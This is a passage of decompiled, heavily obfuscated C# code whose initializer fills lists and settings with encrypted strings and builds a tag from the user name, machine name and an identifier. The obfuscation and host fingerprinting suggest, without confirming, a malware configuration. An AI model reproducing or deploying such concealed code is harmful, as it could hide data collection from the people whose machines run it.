			KsnoBrbTQSaN(_0016(107384815)),
			KsnoBrbTQSaN(_0016(107384806)),
			KsnoBrbTQSaN(_0016(107384765)),
			KsnoBrbTQSaN(_0016(107384708)),
			KsnoBrbTQSaN(_0016(107384115)),
			KsnoBrbTQSaN(_0016(107384082)),
			KsnoBrbTQSaN(_0016(107384053)),
			KsnoBrbTQSaN(_0016(107384044)),
			KsnoBrbTQSaN(_0016(107384003)),
			KsnoBrbTQSaN(_0016(107383970)),
			KsnoBrbTQSaN(_0016(107384401)),
			KsnoBrbTQSaN(_0016(107384344)),
			KsnoBrbTQSaN(_0016(107384303)),
			KsnoBrbTQSaN(_0016(107384274)),
			KsnoBrbTQSaN(_0016(107384265)),
			KsnoBrbTQSaN(_0016(107384176)),
			KsnoBrbTQSaN(_0016(107383599)),
			KsnoBrbTQSaN(_0016(107383542)),
			KsnoBrbTQSaN(_0016(107383477)),
			KsnoBrbTQSaN(_0016(107383460)),
			KsnoBrbTQSaN(_0016(107383907)),
			KsnoBrbTQSaN(_0016(107383850)),
			KsnoBrbTQSaN(_0016(107383817)),
			KsnoBrbTQSaN(_0016(107383776)),
			KsnoBrbTQSaN(_0016(107383703)),
			KsnoBrbTQSaN(_0016(107383690)),
			KsnoBrbTQSaN(_0016(107383117)),
			KsnoBrbTQSaN(_0016(107383084)),
			KsnoBrbTQSaN(_0016(107383043)),
			KsnoBrbTQSaN(_0016(107383010)),
			KsnoBrbTQSaN(_0016(107382937)),
			KsnoBrbTQSaN(_0016(107382920)),
			KsnoBrbTQSaN(_0016(107383355)),
			KsnoBrbTQSaN(_0016(107383282)),
			KsnoBrbTQSaN(_0016(107383269)),
			KsnoBrbTQSaN(_0016(107383192)),
			KsnoBrbTQSaN(_0016(107383179)),
			KsnoBrbTQSaN(_0016(107382626)),
			KsnoBrbTQSaN(_0016(107382521)),
			KsnoBrbTQSaN(_0016(107382492)),
			KsnoBrbTQSaN(_0016(107382451)),
			KsnoBrbTQSaN(_0016(107382386)),
			KsnoBrbTQSaN(_0016(107382885)),
			KsnoBrbTQSaN(_0016(107382856)),
			KsnoBrbTQSaN(_0016(107382779)),
			KsnoBrbTQSaN(_0016(107382714)),
			KsnoBrbTQSaN(_0016(107382717)),
			KsnoBrbTQSaN(_0016(107382660)),
			KsnoBrbTQSaN(_0016(107382083)),
			KsnoBrbTQSaN(_0016(107382010)),
			KsnoBrbTQSaN(_0016(107382013)),
			KsnoBrbTQSaN(_0016(107381940)),
			KsnoBrbTQSaN(_0016(107381891)),
			KsnoBrbTQSaN(_0016(107382342)),
			KsnoBrbTQSaN(_0016(107382269)),
			KsnoBrbTQSaN(_0016(107382192)),
			KsnoBrbTQSaN(_0016(107382159)),
			KsnoBrbTQSaN(_0016(107382150)),
			KsnoBrbTQSaN(_0016(107381529)),
			KsnoBrbTQSaN(_0016(107381516)),
			KsnoBrbTQSaN(_0016(107381395)),
			KsnoBrbTQSaN(_0016(107381378)),
			KsnoBrbTQSaN(_0016(107381861)),
			KsnoBrbTQSaN(_0016(107381788)),
			KsnoBrbTQSaN(_0016(107381723)),
			KsnoBrbTQSaN(_0016(107381706)),
			KsnoBrbTQSaN(_0016(107381617)),
			KsnoBrbTQSaN(_0016(107381072)),
			KsnoBrbTQSaN(_0016(107381011)),
			KsnoBrbTQSaN(_0016(107380954)),
			KsnoBrbTQSaN(_0016(107383850)),
			KsnoBrbTQSaN(_0016(107380929)),
			KsnoBrbTQSaN(_0016(107380856)),
			KsnoBrbTQSaN(_0016(107381311)),
			KsnoBrbTQSaN(_0016(107381234)),
			KsnoBrbTQSaN(_0016(107381173)),
			KsnoBrbTQSaN(_0016(107381148)),
			KsnoBrbTQSaN(_0016(107381103)),
			KsnoBrbTQSaN(_0016(107413342)),
			KsnoBrbTQSaN(_0016(107384176)),
			KsnoBrbTQSaN(_0016(107413277)),
			KsnoBrbTQSaN(_0016(107413204)),
			KsnoBrbTQSaN(_0016(107413147)),
			KsnoBrbTQSaN(_0016(107383599)),
			KsnoBrbTQSaN(_0016(107413586)),
			KsnoBrbTQSaN(_0016(107413569)),
			KsnoBrbTQSaN(_0016(107413480)),
			KsnoBrbTQSaN(_0016(107413415)),
			KsnoBrbTQSaN(_0016(107412822)),
			KsnoBrbTQSaN(_0016(107383477)),
			KsnoBrbTQSaN(_0016(107412777)),
			KsnoBrbTQSaN(_0016(107383817)),
			KsnoBrbTQSaN(_0016(107383460)),
			KsnoBrbTQSaN(_0016(107412744)),
			KsnoBrbTQSaN(_0016(107412655)),
			KsnoBrbTQSaN(_0016(107383907)),
			KsnoBrbTQSaN(_0016(107412622)),
			KsnoBrbTQSaN(_0016(107412605)),
			KsnoBrbTQSaN(_0016(107413068)),
			KsnoBrbTQSaN(_0016(107384265)),
			KsnoBrbTQSaN(_0016(107413011)),
			KsnoBrbTQSaN(_0016(107412998)),
			KsnoBrbTQSaN(_0016(107412969)),
			KsnoBrbTQSaN(_0016(107412940)),
			KsnoBrbTQSaN(_0016(107412895)),
			KsnoBrbTQSaN(_0016(107412862)),
			KsnoBrbTQSaN(_0016(107412325)),
			KsnoBrbTQSaN(_0016(107412248)),
			KsnoBrbTQSaN(_0016(107412255)),
			KsnoBrbTQSaN(_0016(107412182)),
			KsnoBrbTQSaN(_0016(107412169)),
			KsnoBrbTQSaN(_0016(107412088)),
			KsnoBrbTQSaN(_0016(107412575)),
			KsnoBrbTQSaN(_0016(107412542)),
			KsnoBrbTQSaN(_0016(107412465)),
			KsnoBrbTQSaN(_0016(107412432)),
			KsnoBrbTQSaN(_0016(107412423)),
			KsnoBrbTQSaN(_0016(107384274)),
			KsnoBrbTQSaN(_0016(107412088)),
			KsnoBrbTQSaN(_0016(107412382)),
			KsnoBrbTQSaN(_0016(107412353)),
			KsnoBrbTQSaN(_0016(107411812)),
			KsnoBrbTQSaN(_0016(107411731)),
			KsnoBrbTQSaN(_0016(107411722)),
			KsnoBrbTQSaN(_0016(107411629)),
			KsnoBrbTQSaN(_0016(107411588)),
			KsnoBrbTQSaN(_0016(107412071)),
			KsnoBrbTQSaN(_0016(107412038)),
			KsnoBrbTQSaN(_0016(107411965)),
			KsnoBrbTQSaN(_0016(107411936)),
			KsnoBrbTQSaN(_0016(107411859)),
			KsnoBrbTQSaN(_0016(107411282)),
			KsnoBrbTQSaN(_0016(107411249)),
			KsnoBrbTQSaN(_0016(107411236)),
			KsnoBrbTQSaN(_0016(107411175)),
			KsnoBrbTQSaN(_0016(107411142)),
			KsnoBrbTQSaN(_0016(107411065)),
			KsnoBrbTQSaN(_0016(107411512)),
			KsnoBrbTQSaN(_0016(107411479)),
			KsnoBrbTQSaN(_0016(107411438)),
			KsnoBrbTQSaN(_0016(107411421)),
			KsnoBrbTQSaN(_0016(107384401)),
			KsnoBrbTQSaN(_0016(107411392)),
			KsnoBrbTQSaN(_0016(107411335)),
			KsnoBrbTQSaN(_0016(107410782)),
			KsnoBrbTQSaN(_0016(107410705)),
			KsnoBrbTQSaN(_0016(107410696)),
			KsnoBrbTQSaN(_0016(107410619)),
			KsnoBrbTQSaN(_0016(107410590)),
			KsnoBrbTQSaN(_0016(107411021)),
			KsnoBrbTQSaN(_0016(107410972)),
			KsnoBrbTQSaN(_0016(107410947)),
			KsnoBrbTQSaN(_0016(107410890)),
			KsnoBrbTQSaN(_0016(107410845)),
			KsnoBrbTQSaN(_0016(107410260)),
			KsnoBrbTQSaN(_0016(107410203)),
			KsnoBrbTQSaN(_0016(107384344)),
			KsnoBrbTQSaN(_0016(107410130)),
			KsnoBrbTQSaN(_0016(107410101)),
			KsnoBrbTQSaN(_0016(107410068)),
			KsnoBrbTQSaN(_0016(107410059)),
			KsnoBrbTQSaN(_0016(107410510)),
			KsnoBrbTQSaN(_0016(107383970)),
			KsnoBrbTQSaN(_0016(107410501)),
			KsnoBrbTQSaN(_0016(107410420)),
			KsnoBrbTQSaN(_0016(107410391)),
			KsnoBrbTQSaN(_0016(107382717)),
			KsnoBrbTQSaN(_0016(107410358)),
			KsnoBrbTQSaN(_0016(107410391)),
			KsnoBrbTQSaN(_0016(107410329)),
			KsnoBrbTQSaN(_0016(107410300)),
			KsnoBrbTQSaN(_0016(107410303)),
			KsnoBrbTQSaN(_0016(107409710)),
			KsnoBrbTQSaN(_0016(107409693)),
			KsnoBrbTQSaN(_0016(107409620)),
			KsnoBrbTQSaN(_0016(107409559)),
			KsnoBrbTQSaN(_0016(107409530)),
			KsnoBrbTQSaN(_0016(107410001)),
			KsnoBrbTQSaN(_0016(107409988)),
			KsnoBrbTQSaN(_0016(107409911)),
			KsnoBrbTQSaN(_0016(107409878)),
			KsnoBrbTQSaN(_0016(107409853)),
			KsnoBrbTQSaN(_0016(107409776)),
			KsnoBrbTQSaN(_0016(107409207)),
			KsnoBrbTQSaN(_0016(107409174)),
			KsnoBrbTQSaN(_0016(107409133)),
			KsnoBrbTQSaN(_0016(107409104)),
			KsnoBrbTQSaN(_0016(107409043)),
			KsnoBrbTQSaN(_0016(107409010)),
			KsnoBrbTQSaN(_0016(107409465)),
			KsnoBrbTQSaN(_0016(107409424)),
			KsnoBrbTQSaN(_0016(107409407)),
			KsnoBrbTQSaN(_0016(107409374)),
			KsnoBrbTQSaN(_0016(107409293)),
			KsnoBrbTQSaN(_0016(107409280)),
			KsnoBrbTQSaN(_0016(107408687)),
			KsnoBrbTQSaN(_0016(107408674)),
			KsnoBrbTQSaN(_0016(107408593)),
			KsnoBrbTQSaN(_0016(107408560)),
			KsnoBrbTQSaN(_0016(107408551)),
			KsnoBrbTQSaN(_0016(107408510)),
			KsnoBrbTQSaN(_0016(107408945)),
			KsnoBrbTQSaN(_0016(107411722)),
			KsnoBrbTQSaN(_0016(107408912)),
			KsnoBrbTQSaN(_0016(107408903)),
			KsnoBrbTQSaN(_0016(107408814)),
			KsnoBrbTQSaN(_0016(107408785)),
			KsnoBrbTQSaN(_0016(107408752)),
			KsnoBrbTQSaN(_0016(107408207)),
			KsnoBrbTQSaN(_0016(107408190)),
			KsnoBrbTQSaN(_0016(107408161)),
			KsnoBrbTQSaN(_0016(107408084)),
			KsnoBrbTQSaN(_0016(107408071)),
			KsnoBrbTQSaN(_0016(107408030)),
			KsnoBrbTQSaN(_0016(107408485)),
			KsnoBrbTQSaN(_0016(107408404)),
			KsnoBrbTQSaN(_0016(107408375)),
			KsnoBrbTQSaN(_0016(107408362))
		};
		XYTVFNmWPjt = new List<string>
		{
			KsnoBrbTQSaN(_0016(107408321)),
			KsnoBrbTQSaN(_0016(107408240)),
			KsnoBrbTQSaN(_0016(107407711)),
			KsnoBrbTQSaN(_0016(107407630)),
			KsnoBrbTQSaN(_0016(107407613)),
			KsnoBrbTQSaN(_0016(107407516)),
			KsnoBrbTQSaN(_0016(107407951)),
			KsnoBrbTQSaN(_0016(107407890))
		};
		cYRnUVUQWZjBbG = new List<string>
		{
			KsnoBrbTQSaN(_0016(107407833)),
			KsnoBrbTQSaN(_0016(107407800)),
			KsnoBrbTQSaN(_0016(107407787)),
			KsnoBrbTQSaN(_0016(107407194)),
			KsnoBrbTQSaN(_0016(107407161)),
			KsnoBrbTQSaN(_0016(107407144)),
			KsnoBrbTQSaN(_0016(107407067)),
			KsnoBrbTQSaN(_0016(107407034)),
			KsnoBrbTQSaN(_0016(107407001)),
			KsnoBrbTQSaN(_0016(107406968)),
			KsnoBrbTQSaN(_0016(107407447)),
			KsnoBrbTQSaN(_0016(107407414)),
			KsnoBrbTQSaN(_0016(107407373)),
			KsnoBrbTQSaN(_0016(107407364)),
			KsnoBrbTQSaN(_0016(107407287)),
			KsnoBrbTQSaN(_0016(107407254)),
			KsnoBrbTQSaN(_0016(107407213)),
			KsnoBrbTQSaN(_0016(107406700)),
			KsnoBrbTQSaN(_0016(107406659)),
			KsnoBrbTQSaN(_0016(107406586)),
			KsnoBrbTQSaN(_0016(107406553)),
			KsnoBrbTQSaN(_0016(107406512)),
			KsnoBrbTQSaN(_0016(107406479)),
			KsnoBrbTQSaN(_0016(107407833)),
			KsnoBrbTQSaN(_0016(107406470)),
			KsnoBrbTQSaN(_0016(107406941)),
			KsnoBrbTQSaN(_0016(107406864)),
			KsnoBrbTQSaN(_0016(107406831)),
			KsnoBrbTQSaN(_0016(107406822)),
			KsnoBrbTQSaN(_0016(107406781)),
			KsnoBrbTQSaN(_0016(107406716)),
			KsnoBrbTQSaN(_0016(107406163)),
			KsnoBrbTQSaN(_0016(107406154)),
			KsnoBrbTQSaN(_0016(107407800)),
			KsnoBrbTQSaN(_0016(107406113)),
			KsnoBrbTQSaN(_0016(107407787)),
			KsnoBrbTQSaN(_0016(107406080)),
			KsnoBrbTQSaN(_0016(107406047)),
			KsnoBrbTQSaN(_0016(107405974)),
			KsnoBrbTQSaN(_0016(107405941)),
			KsnoBrbTQSaN(_0016(107406444)),
			KsnoBrbTQSaN(_0016(107406403)),
			KsnoBrbTQSaN(_0016(107406370)),
			KsnoBrbTQSaN(_0016(107406337)),
			KsnoBrbTQSaN(_0016(107406264)),
			KsnoBrbTQSaN(_0016(107406223)),
			KsnoBrbTQSaN(_0016(107406214))
		};
		DYUDOtUaolJR = new List<string>
		{
			KsnoBrbTQSaN(XoauCcwIXoBdG(_0016(107405661))),
			KsnoBrbTQSaN(_0016(107405612)),
			KsnoBrbTQSaN(_0016(107405487)),
			KsnoBrbTQSaN(_0016(107405902)),
			KsnoBrbTQSaN(_0016(107405809)),
			KsnoBrbTQSaN(_0016(107405712)),
			KsnoBrbTQSaN(_0016(107405107)),
			KsnoBrbTQSaN(_0016(107405010)),
			KsnoBrbTQSaN(_0016(107404917)),
			KsnoBrbTQSaN(_0016(107405332)),
			KsnoBrbTQSaN(_0016(107405239)),
			KsnoBrbTQSaN(_0016(107404630)),
			KsnoBrbTQSaN(_0016(107404537)),
			KsnoBrbTQSaN(XoauCcwIXoBdG(_0016(107405661)))
		};
		MaECdwVpsczmu = KsnoBrbTQSaN(_0016(107404440));
		crllYeSsbsC = new List<string>
		{
			KsnoBrbTQSaN(_0016(107404871)),
			KsnoBrbTQSaN(_0016(107404677)),
			KsnoBrbTQSaN(_0016(107403971)),
			KsnoBrbTQSaN(_0016(107404289)),
			KsnoBrbTQSaN(_0016(107403583)),
			KsnoBrbTQSaN(_0016(107403389))
		};
		TirtJYKVVld = new List<string>
		{
			KsnoBrbTQSaN(_0016(107403675)),
			KsnoBrbTQSaN(_0016(107403646)),
			KsnoBrbTQSaN(_0016(107403073))
		};
		PowXyKwNktZ = _0016(107396997);
		xWhRipHNXofPbg = _0016(107396997);
		oLBievUyDcbkUxU = new DateTime(2000, 1, 1);
		zEbXuEhBhrGIBiE = new DateTime(2100, 1, 1);
		ZgMAQkWlMGVlQB = _0016(107396837);
		phsLIEBLTPR = _0016(107385939);
		GPURiHCEswAQqyG = _0016(107396997);
		gOnzhZVscHtHEA = _0016(107396997);
		UhahWHggJKRXH = _0016(107396997);
		sBJyvWUPVYJGomCj = _0016(107396837);
		HpzDrsLZJMEAsBEP = _0016(107396997);
		XLjwIPnIAHXCZ = _0016(107396997);
		qUoKxlxkuFsMOBYn = new List<string>
		{
			_0016(107395826),
			_0016(107396052),
			_0016(107395860),
			_0016(107395965)
		};
		ASnTkTTzzlTA = _0016(107396997);
		UqzEWVXQurQ = _0016(107403012);
		RduxjsdlGU = _0016(107396837);
		vnKnIgGgkpYwK = _0016(107396997);
		FgZHwwTkLhi = _0016(107396997);
		vvtVglKzWhlus = string.Empty;
		pEvrDrkNSajWbK = _0016(107396997);
		mSLrFwQNhiEl = _0016(107396997);
		UalKDTXkwjDKg = _0016(107396997);
		ARnwrVkoxumnn = _0016(107388361);
		eLQAQoIdeENep = _0016(107388361);
		xYYLcdseTgQWbebv = _0016(107396997);
		cfoPXtIlVaAipP = _0016(107396997);
		WGykFPOvUTVh = _0016(107396837);
		UoSZJpwWoej = _0016(107396997);
		AEyeldIZLhfif = _0016(107396997);
		GdsWqHYzFrLi = _0016(107403007);
		qzFWqUKZSL = _0016(107396997);
		PZzpKsqvMdSQSH = _0016(107396997);
		ugIteiXGeHBYH = _0016(107402958);
		TAqzrCZOZCbktGxO = _0016(107396997);
		fzCzbnmtGWQLw = _0016(107396997);
		ahgwKYBhqErWt = _0016(107396837);
		HIjyMnEjqFkIVFWP = _0016(107396997);
		iNAczKOivbE = _0016(107402973);
		qIHInwsrXSVk = _0016(107396837);
		YtsYOxvPhpYvsqia = _0016(107396837);
		lNQWlldAsvUOD = _0016(107396997);
		HXGAbpusxAtHwkm = _0016(107396997);
		JRIWDxjKnYP = new string[0];
		TMMTTmWVJnveZ = _0016(107396997);
		LZWNsbTTjOGKx = true;
		LbuRUPTRClHXO = _0016(107396997);
		OmLPyoScyL = true;
		sCehMLCbUUnVqZ = false;
		GHovUqtwvuKH = false;
		fVbviOHbEwWlbJc = false;
		hBPcxbXfrBbYZwL = _0016(107402928);
		QCmKQKwvWBrFEj = false;
		njCLqJViuRVQKe = false;
		JQnvKumvWqslT = true;
		aNXCscvybLN = false;
		heKpdwyJrkK = true;
		TyXSqILJGWkm = _0016(107402907) + Environment.UserName + _0016(107402894) + Environment.MachineName + _0016(107402873) + wihATTbwYdHSl.MVogxnZmiDFB() + _0016(107402868);
		IHUVFGfndtpl = false;
		EjlvAeqfnx = new Stopwatch();
		WetxdZxAdgUqT = 0;
		JSBuxhHRYzkt = 0;
		uDFeFGGkwluj = false;
		cshPaWeUxvVg = _0016(107402891) + wihATTbwYdHSl.MVogxnZmiDFB() + _0016(107402882);
		hSElXxgkerZPAvg = new string[1] { _0016(107402877) };
		BdqapSgxTAf = new List<string>();
		mRRsxGPnuCU = 0;
	}
}
